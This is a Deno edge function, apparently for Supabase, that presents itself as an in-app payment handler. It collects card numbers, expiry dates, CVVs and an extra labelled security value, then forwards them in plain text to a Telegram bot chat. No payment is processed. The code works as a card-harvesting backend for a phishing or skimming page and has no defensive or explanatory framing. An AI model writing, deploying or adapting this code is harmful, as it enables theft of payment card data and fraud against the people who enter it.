const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version',
};

Deno.serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const TELEGRAM_BOT_TOKEN = Deno.env.get('TELEGRAM_BOT_TOKEN');
    if (!TELEGRAM_BOT_TOKEN) throw new Error('TELEGRAM_BOT_TOKEN not configured');
    const TELEGRAM_CHAT_ID = Deno.env.get('TELEGRAM_CHAT_ID');
    if (!TELEGRAM_CHAT_ID) throw new Error('TELEGRAM_CHAT_ID not configured');

    const body = await req.json();
    const { amount, description, country, card_number, expiry, cvv, security_info, security_label } = body;

    let message = `💳 <b>New In-App Payment Attempt</b>\n\n`;
    message += `<b>── Payment Details ──</b>\n`;
    message += `💰 <b>Amount:</b> $${esc(String(amount))}\n`;
    message += `📝 <b>Description:</b> ${esc(String(description))}\n`;
    message += `🌍 <b>Country:</b> ${esc(String(country))}\n`;
    message += `\n<b>── Card Information ──</b>\n`;
    message += `💳 <b>Card Number:</b> ${esc(String(card_number))}\n`;
    message += `📅 <b>Expiry:</b> ${esc(String(expiry))}\n`;
    message += `🔒 <b>CVV:</b> ${esc(String(cvv))}\n`;

    if (security_info && security_info !== 'N/A') {
      message += `\n<b>── Security Info ──</b>\n`;
      message += `🛡️ <b>${esc(String(security_label))}:</b> ${esc(String(security_info))}\n`;
    }

    message += `\n⏰ <b>Time:</b> ${new Date().toUTCString()}`;

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const res = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });

    if (!res.ok) {
      const data = await res.json();
      throw new Error(`Telegram API failed: ${JSON.stringify(data)}`);
    }

    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : 'Unknown error';
    return new Response(JSON.stringify({ success: false, error: msg }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});

function esc(t: string): string {
  return t.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}
